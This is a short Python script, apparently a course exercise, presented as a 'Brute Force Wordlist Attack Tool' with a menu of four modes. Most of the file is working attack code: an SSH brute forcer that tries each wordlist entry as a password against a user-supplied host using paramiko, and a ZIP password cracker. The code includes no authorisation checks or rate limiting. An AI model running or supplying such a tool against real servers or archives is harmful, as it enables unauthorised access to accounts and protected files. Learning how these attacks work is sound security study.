import time
import getpass
import paramiko
import zipfile

# Mode 1: Dictionary Iterator
def dictionary_iterator():
    filepath = input("Enter your dictionary filepath:\n")
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.strip()
            print(word)
            time.sleep(1)

# Mode 2: Password Recognized
def password_recognized():
    filepath = input("Enter your dictionary filepath:\n")
    string = getpass.getpass("Enter a string: ")
    with open(filepath, encoding="ISO-8859-1") as file:
        if string in file.read():
            print(f"The string '{string}' was found in the word list.")
        else:
            print(f"The string '{string}' was not found in the word list.")

# Mode 3: SSH Brute Forcer
def ssh_brute_forcer():
    host = input("Enter the SSH server IP address: ")
    port = 22
    username = input("Enter the SSH username: ")
    filepath = input("Enter your dictionary filepath:\n")
    
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.strip()
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh_client.connect(host, port, username, password)
                print(f"[+] Found password: {password}")
                ssh_client.close()
                return
            except paramiko.AuthenticationException:
                ssh_client.close()
                continue
        print("[-] Password not found in the wordlist.")

# Mode 4: Brute Force ZIP File
def brute_force_zip():
    zip_filename = input("Enter the path to the ZIP file: ")
    wordlist_filename = input("Enter your dictionary filepath:\n")
    
    with zipfile.ZipFile(zip_filename, 'r') as zf:
        with open(wordlist_filename, 'r', errors='replace') as wordlist:
            for word in wordlist:
                word = word.strip()
                try:
                    zf.extractall(pwd=word.encode('utf-8'))
                    print(f"[+] Password found: {word}")
                    return word
                except RuntimeError:
                    continue
            print("[-] Password not found in the wordlist.")

# Main Function
if __name__ == "__main__":
    while True:
        mode = input("""
Brute Force Wordlist Attack Tool Menu
1 - Offensive, Dictionary Iterator
2 - Defensive, Password Recognized
3 - SSH Brute Forcer
4 - Brute Force ZIP File
5 - Exit
Please enter a number: 
""")
        if mode == "1":
            dictionary_iterator()
        elif mode == "2":
            password_recognized()
        elif mode == "3":
            ssh_brute_forcer()
        elif mode == "4":
            brute_force_zip()
        elif mode == "5":
            break
        else:
            print("Invalid selection...")








# Attribution to chatgpt4 code interpreter and codefellows github